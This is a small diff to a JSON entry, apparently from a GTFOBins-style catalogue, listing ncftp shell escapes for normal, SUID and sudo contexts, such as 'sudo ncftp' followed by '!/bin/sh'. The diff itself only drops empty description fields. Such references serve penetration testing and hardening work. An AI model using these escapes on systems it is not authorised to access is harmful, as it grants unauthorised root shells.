@@ -2,19 +2,19 @@
   "functions": {
     "shell": [
       {
-        "description": "",
+        
         "code": "ncftp\n!/bin/sh\n"
       }
     ],
     "suid": [
       {
-        "description": "",
+        
         "code": "./ncftp\n!/bin/sh -p\n"
       }
     ],
     "sudo": [
       {
-        "description": "",
+        
         "code": "sudo ncftp\n!/bin/sh\n"
       }
     ]
